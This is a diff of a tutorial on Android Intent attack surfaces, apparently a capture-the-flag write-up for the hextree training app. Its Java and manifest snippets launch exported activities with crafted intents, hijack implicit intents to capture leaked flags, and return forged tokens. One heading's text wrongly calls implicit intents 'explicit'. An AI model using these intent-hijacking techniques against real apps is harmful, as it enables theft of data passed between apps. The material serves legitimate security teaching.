@@ -6,43 +6,60 @@ description: "Learn about Android Intent attack surfaces, how to start activitie
 
 ## Introduction
 
-An intent is an object designed to facilitate communication between components of Android Applications.
+An **Intent** is an object that facilitates communication between components of an Android application. It is commonly used to **start activities**, **start services**, or **deliver broadcasts** to a **receiver**.
 
-It is used to start **activities**, **services** or deliver a broadcast to a **receiver**.
+An Intent can encapsulate several types of information:
 
-An intent encapsulate various type of information:
+* Action – Specifies the general action to be performed (e.g., view, send, or edit).
+* Category – Provides additional information about the action, helping Android determine the appropriate component to handle it.
+* Type – Defines the MIME type of the data being handled (e.g., "image/png", "text/plain").
+* Data – Refers to the actual data the Intent operates on, often represented as a URI.
+* Flags – Provide additional instructions on how the component should be launched (e.g., start in a new task or clear existing activities).
 
-* **action request**
-* **category**
-* **type**
-* **data**
-* **flags**
+Intents can be explicit or implicit.
 
-It can be:
+### Explicit intent
 
-1. **explicit** (specifies the exact component)
+An intent is called **explicit** when you specify the exact component.
 
-Use case: Starting a specific Activity or Service in the same app.
+Use case: Starting a specific activity or service, etc.
 
 ```java
-Intent intent = new Intent(this, SecondActivity.class);
-intent.putExtra("username", "Alice");
+Intent intent = new Intent();
+intent.setComponent(new ComponentName(
+        "io.hextree.attacksurface",
+        "io.hextree.attacksurface.activities.Flag2Activity"
+));
+intent.setAction("io.hextree.action.GIVE_FLAG");
 startActivity(intent);
 ```
 
-2. **implicit** (does not specify a component name)
+### Implicit intent
+
+An intent is called **explicit** you don't specify component name.
 
 Use case: Open a web page, send an email, share content, take a photo, etc.
 
 ```java
-Intent intent = new Intent(Intent.ACTION_VIEW);
-intent.setData(Uri.parse("https://www.example.com"));
+Intent intent = new Intent();
+intent.setAction("android.media.action.IMAGE_CAPTURE");
 startActivity(intent);
 ```
 
-**Incoming Intent**
+When you use implicit intents you’re asking Android to perform an action, not specifying which app should do it. An **Intent Filter** declares what types of intents an Activity (or Service, or BroadcastReceiver) can respond to. You put it in the `AndroidManifest.xml` file.
 
-`getIntent()` is a method in Android used to retrieve the **Intent.**
+```xml
+<activity ... >
+    <intent-filter>
+        <action android:name="android.media.action.IMAGE_CAPTURE"/>
+        <category android:name="android.intent.category.DEFAULT"/>
+    </intent-filter>
+</activity>
+```
+
+### Retrieve Intent
+
+`getIntent()` is a method in Android to access that intent and extract any data that was sent.
 
 ---
 
@@ -108,12 +125,9 @@ Let's say that the app `io.hextree.attacksurface` has the following activity:
 
 ```java
 public class Flag2Activity extends AppCompactActivity {
-    public Flag2Activity() {
-        ...
-    }
+    public Flag2Activity() {...}
 
     protected void onCreate(Bundle bundle) {
-        super.onCreate(bundle);
         ...
         String action = getIntent().getAction();
         if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
@@ -156,19 +170,15 @@ Let's say that the app `io.hextree.attacksurface` has the following activitiy:
 
 ```java
 public class Flag3Activity extends AppCompactActivity {
-    public Flag3Activity() {
-        ...
-    }
+    public Flag3Activity() {...}
 
     protected void onCreate(Bundle bundle) {
-        super.onCreate(bundle);
         ...
         Intent intent = getIntent();
         String action = intent.getAction();
         if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
             return;
         }
-        this.f182f.addTag(action);
         Uri data = intent.getData();
         if (data == null || !data.toString().equals("https://app.hextree.io/map/android")) {
             return;
@@ -206,26 +216,18 @@ Let's say that the app `io.hextree.attacksurface` has the following activity:
 
 ```java
 public class Flag4Activity extends AppCompactActivity {
-    public Flag4Activity() {
-        ...
-    }
+    public Flag4Activity() {...}
 
-    public enum State {
-        ...
-    }
+    public enum State {...}
 
     protected void onCreate(Bundle bundle) {
         ...
         stateMachine(getIntent());
     }
 
-    private State getCurrentState() {
-        ...
-    }
+    private State getCurrentState() {...}
 
-    private void setCurrentState(State state) {
-        ...
-    }
+    private void setCurrentState(State state) {...}
 
     public void stateMachine(Intent intent) {
         String action = intent.getAction();
@@ -335,9 +337,7 @@ Let's say that the app `io.hextree.attacksurface` has the following activity:
 public class Flag5Activity extends AppCompactActivity {
     Intent nextIntent = null;
 
-    public Flag5Activity() {
-        ...
-    }
+    public Flag5Activity() {...}
 
     protected void onCreate(Bundle bundle) {
         super.onCreate(bundle);
@@ -400,9 +400,7 @@ Let's say that the app `io.hextree.attacksurface` has the following activity:
 
 ```java
 public class Flag7Activity extends AppCompactActivity {
-    public Flag7Activity() {
-        ...
-    }
+    public Flag7Activity() {...}
 
     @Override
     protected void onCreate(Bundle bundle) {
@@ -439,7 +437,6 @@ To solve this challenge you can send the following intents:
 ```java
 Intent firstIntent = new Intent();
 firstIntent.setAction("OPEN");
-
 firstIntent.setComponent(new ComponentName(
         "io.hextree.attacksurface",
         "io.hextree.attacksurface.activities.Flag7Activity"
@@ -481,9 +478,7 @@ Let's say that the app `io.hextree.attacksurface` has the following activity:
 
 ```java
 public class Flag6Activity extends AppCompactActivity {
-    public Flag6Activity() {
-        ...
-    }
+    public Flag6Activity() {...}
 
     @Override
     protected void onCreate(Bundle bundle) {
@@ -534,4 +529,297 @@ firstIntent.setComponent(new ComponentName(
 ));
 startActivity(firstIntent);
 ```
+
+### Returning Activity Results
+
+It's important to remember that starting activities is not just a one-way communication. When you start an activity with `startActivityForResult()`, you can also get a result back from the caller.
+
+Let's say that the app `io.hextree.attacksurface` has the following activity:
+
+```xml
+<activity
+    android:name="io.hextree.attacksurface.activities.Flag9Activity"
+    android:exported="true"/>
+```
+
+```java
+public class Flag9Activity extends AppCompactActivity {
+    public Flag9Activity() {...}
+
+    @Override
+    protected void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        this.f182f = new LogHelper(this);
+        ComponentName callingActivity = getCallingActivity();
+        if (callingActivity == null || !callingActivity.getClassName().contains("Hextree")) {
+            return;
+        }
+        Intent intent = new Intent("flag");
+        this.f182f.addTag(intent);
+        this.f182f.addTag(42);
+        intent.putExtra("flag", this.f182f.appendLog(this.flag));
+        setResult(-1, intent);
+        finish();
+        success(this);
+    }
+}
+```
+
+Basically, when this Activity starts, it checks who launched it.
+If the launcher’s class name contains "Hextree", it creates an Intent containing a “flag” value, marks the result as successful, sends it back to the caller, closes itself, and logs the success.
+
+In this case you can get the flag by using `onActivityResult()`.
+
+```java
+public class MainHextreeActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        ...
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.activities.Flag9Activity"
+        ));
+        startActivityForResult(intent, 5);
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        String flag = data.getStringExtra("flag");
+        Log.d("Flag", flag);
+    }
+}
+```
+
+---
+
+### Hijack Implicit Intents
+
+Receiving implicit intents can lead to common security issues. If an app uses implicit intents insecurely, for example, by transmitting sensitive data, then registering a handler for that intent could potentially be exploited by malicious components.
+
+Let's say that the app `io.hextree.attacksurface` has the following activity:
+
+```xml
+<activity
+    android:name="io.hextree.attacksurface.activities.Flag10Activity"
+    android:exported="false"/>
+```
+
+```java
+public class Flag10Activity extends AppCompactActivity {
+    public Flag10Activity() {...}
+
+    @Override
+    protected void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        this.f182f = new LogHelper(this);
+        if (getIntent().getAction() == null) {
+            Toast.makeText(this, "Sending implicit intent with the flag\nio.hextree.attacksurface.ATTACK_ME", 1).show();
+            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
+            intent.addFlags(8);
+            this.f182f.addTag(intent);
+            intent.putExtra("flag", this.f182f.appendLog(this.flag));
+            try {
+                startActivity(intent);
+                success(this);
+            } catch (RuntimeException e) {
+                e.printStackTrace();
+                Toast.makeText(this, "No app found to handle the intent\nio.hextree.attacksurface.ATTACK_ME", 1).show();
+                finish();
+            }
+        }
+    }
+}
+```
+
+To obtain this flag, register an intent filter with the action `io.hextree.attacksurface.ATTACK_ME` as follows:
+
+```xml
+<activity
+    android:name=".MainActivity"
+    android:exported="true">
+    <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.LAUNCHER" />
+    </intent-filter>
+    <intent-filter>
+        <action android:name="io.hextree.attacksurface.ATTACK_ME" />
+        <category android:name="android.intent.category.DEFAULT" />
+    </intent-filter>
+</activity>
+```
+
+```java
+Intent intent = getIntent();
+String flag = intent.getStringExtra("flag");
+if (flag != null) {
+    Log.d("flag", flag);
+} else {
+    Log.w("flag", "No flag found in intent");
+}
+```
+
+<details>
+<summary>
+Another example (1)
+</summary>
+
+Let’s say that the app `io.hextree.attacksurface` has the following activity:
+
+```xml
+<activity
+    android:name="io.hextree.attacksurface.activities.Flag11Activity"
+    android:exported="false"/>
+```
+
+```java
+public class Flag11Activity extends AppCompactActivity {
+    public Flag11Activity() {...}
+
+    @Override
+    protected void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        this.f182f = new LogHelper(this);
+        if (getIntent().getAction() == null) {
+            Toast.makeText(this, "Sending implicit intent to\nio.hextree.attacksurface.ATTACK_ME", 1).show();
+            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
+            intent.addFlags(8);
+            try {
+                startActivityForResult(intent, 42);
+            } catch (RuntimeException e) {
+                e.printStackTrace();
+                Toast.makeText(this, "No app found to handle the intent\nio.hextree.attacksurface.ATTACK_ME", 1).show();
+                finish();
+            }
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int i, int i2, Intent intent) {
+        if (intent != null && intent.getIntExtra("token", -1) == 1094795585) {
+            this.f182f.addTag(1094795585);
+            success(this);
+        }
+        super.onActivityResult(i, i2, intent);
+    }
+}
+```
+
+To obtain this flag, register an intent filter with the action `io.hextree.attacksurface.ATTACK_ME` as follows:
+
+```xml
+<activity
+    android:name=".MainActivity"
+    android:exported="true">
+    <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.LAUNCHER" />
+    </intent-filter>
+    <intent-filter>
+        <action android:name="io.hextree.attacksurface.ATTACK_ME" />
+        <category android:name="android.intent.category.DEFAULT" />
+    </intent-filter>
+</activity>
+```
+
+```java
+Intent intent = new Intent();
+intent.putExtra("token", 1094795585);
+setResult(5, intent);
+```
+
+</details>
+
+
+<details>
+<summary>
+Another example (2)
+</summary>
+
+Let’s say that the app `io.hextree.attacksurface` has the following activity:
+
+```xml
+<activity
+    android:name="io.hextree.attacksurface.activities.Flag12Activity"
+    android:exported="true"/>
+```
+
+```java
+public class Flag12Activity extends AppCompactActivity {
+    public Flag12Activity() {...}
+
+    @Override 
+    protected void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        if (getIntent().getAction() == null) {
+            Toast.makeText(this, "Sending implicit intent to\nio.hextree.attacksurface.ATTACK_ME", 1).show();
+            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
+            intent.addFlags(8);
+            try {
+                startActivityForResult(intent, 42);
+            } catch (RuntimeException e) {
+                e.printStackTrace();
+                Toast.makeText(this, "No app found to handle the intent\nio.hextree.attacksurface.ATTACK_ME", 1).show();
+                finish();
+            }
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int i, int i2, Intent intent) {
+        super.onActivityResult(i, i2, intent);
+        if (intent == null || getIntent() == null || !getIntent().getBooleanExtra("LOGIN", false)) {
+            return;
+        }
+        if (intent.getIntExtra("token", -1) == 1094795585) {
+            success(this);
+        }
+    }
+}
+```
+
+To obtain this flag, create two activities and register an intent filter with the action `io.hextree.attacksurface.ATTACK_ME` as follows:
+
+```xml
+<activity
+    android:name=".SecondActivity"
+    android:exported="true">
+    <intent-filter>
+        <action android:name="io.hextree.attacksurface.ATTACK_ME" />
+        <category android:name="android.intent.category.DEFAULT" />
+    </intent-filter>
+</activity>
+
+<activity
+    android:name=".MainActivity"
+    android:exported="true">
+    <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.LAUNCHER" />
+    </intent-filter>
+</activity>
+```
+
+```java
+// MainActivity
+Intent intent = new Intent();
+intent.setComponent(new ComponentName(
+        "io.hextree.attacksurface",
+        "io.hextree.attacksurface.activities.Flag12Activity"
+));
+intent.putExtra("LOGIN", true);
+startActivity(intent);
+
+//SecondActivity
+Intent intent = getIntent();
+if (intent != null) {
+    Intent intentResult = new Intent();
+    intentResult.putExtra("token", 1094795585);
+    setResult(RESULT_OK, intentResult);
+}
+```
+
+</details>
 
